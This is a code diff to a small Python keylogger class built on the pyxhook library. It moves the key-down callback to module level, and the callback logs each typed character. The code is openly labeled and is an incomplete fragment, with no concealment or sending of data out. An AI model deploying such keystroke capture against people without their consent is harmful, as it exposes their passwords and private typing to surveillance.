@@ -2,6 +2,15 @@ import logging
 import pyxhook
 
 
+def _keydown_callback(key: pyxhook.pyxhook.PyxHookKeyEvent):
+    """
+    The handler for keyboard events
+
+    :param key: The key down event
+    """
+
+    logging.debug(chr(key.Ascii))
+
 class Keylogger:
     """ 
     Logs key events to a file
@@ -26,7 +35,7 @@ class Keylogger:
         """
         
         # Assign callback for handling key strokes.
-        self.manager.KeyDown = self._keydown_callback
+        self.manager.KeyDown = _keydown_callback
         
         # Hook the keyboard and start logging.
         self.manager.HookKeyboard()
@@ -41,16 +50,6 @@ class Keylogger:
         # Stops listening for key events (I think its the correct function?)
         self.manager.cancel()
         
-
-    def _keydown_callback(self, key: pyxhook.pyxhook.PyxHookKeyEvent):
-        """ 
-        The handler for keyboard events
-        
-        :param key: The key down event
-        """
-        
-        logging.debug(chr(key.Ascii))
-
 
     def setup(self) -> None:
         """
